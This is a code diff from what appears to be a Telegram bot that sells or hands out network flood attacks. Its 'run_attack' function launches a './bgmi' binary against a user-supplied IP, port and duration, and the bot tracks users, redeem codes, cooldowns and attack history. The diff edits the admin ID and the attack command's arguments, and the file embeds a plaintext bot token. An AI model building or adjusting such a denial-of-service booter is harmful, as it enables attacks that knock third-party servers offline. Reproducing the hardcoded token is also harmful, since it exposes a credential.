@@ -27,7 +27,7 @@ users_collection = db['DARK']
 redeem_codes_collection = db['redeem_codes0']
 
 TELEGRAM_BOT_TOKEN = '8078932996:AAGd4u-cX96yInbNHD_QCJZ56gZ7a9Lqt9c'
-ADMIN_USER_ID = 7353797869
+ADMIN_USER_ID = 7352008650
 
 cooldown_dict = {}
 user_attack_history = {}
@@ -176,7 +176,7 @@ async def papa_bol(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./bgmi {ip} {port} {duration}1024 30",
+            f"./bgmi {ip} {port} {duration}",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
